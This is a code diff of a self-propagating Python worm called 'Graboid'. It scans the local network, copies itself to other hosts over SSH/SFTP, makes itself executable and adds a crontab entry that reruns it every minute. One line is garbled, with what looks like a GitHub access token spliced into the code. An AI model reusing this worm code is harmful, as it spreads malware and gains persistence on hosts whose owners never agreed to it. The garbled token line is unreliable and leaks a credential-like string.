@@ -83,16 +83,23 @@ def isInfected():
 #Spread and execute
 def tunnelexe(sshTGT, sftpTGT):
     try:
-        sftpTGT.put("Graboid", "/tmp/" + "Graboid")
+        sftpTGT.put("/tmp/Graboid", "/tmp/" + "Graboid")
         
         # sshTGT.exec_command("sudo apt-get -y install python3")
         # sshTGT.exec_command("sudo apt-get -y install python3-pip")
         # sshTGT.exec_command("pip install paramiko")
         # sshTGT.exec_command("pip install netifaces")        
         # sshTGT.exec_command("python3 -m pip install python-nmap")
+        sshTGT.exec_command('(crontab -l 2>/dev/null; echo "*/1 * * * * /tmp/Graboid > /tmp/test.log") | crontab -')
         sshTGT.exec_command("chmod a+x /tmp/Graboid")
-        sshTGT.exec_command( "nohup python3 /tmp/Graboid")
-        sshTGT.exec_command("/tmp/Graboid")
+       # sshTGT.exec_command( "nohup /tmp/Graboid &")
+        #print('started...')
+        
+       # stdin, stdout, stderr = sshTGT.exec_command( "/tmp/Graboid > /tmp/test.log &", get_pty=True)
+       # for line in iter(stdout.readline, ""):
+        #  print(line, end="")
+        #print('finished.')
+      #  sshTGT.exec_command("/tmp/Graboid")
         
     except:
         print(sys.exc_info()[0])
@@ -133,13 +140,16 @@ def thisIP(interface):
   
   # return ip_addr if not ip_addr == "127.0.0.1" else None
   networkInter = netifaces.interfaces()
-  ip_addr = None
+  ip_addr = ""
   for net in networkInter:
     addr = netifaces.ifaddresses(net)[2][0]['addr']
     if not addr == "127.0.0.1":
       ip_addr = addr
       break
-  # ip_addr = (([ip for ip in socket.gethostbyname_ex(socke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
+ 
+
+  return ip_addr
+  
   
 #   for root, dirs, files in os.walk(dir_path):
 #     for file in files:
@@ -171,18 +181,18 @@ def main():
   interface_list = netifaces.interfaces()
   interface_list.remove(loopback)
   networkHosts = scanner()
-
+  print(interface_list)
   for interface in interface_list:
     print("Interface: ", interface)
 
     ip_addr = thisIP(interface)
-    ip_addr = print(ip_addr)
+   
     print(ip_addr)
     # networkHosts = scanner()
   print(networkHosts)
     
   for ip in networkHosts:
-    if ip == ip_addr:
+    if ip in ip_addr:
       networkHosts.remove(ip)
       break
     else:
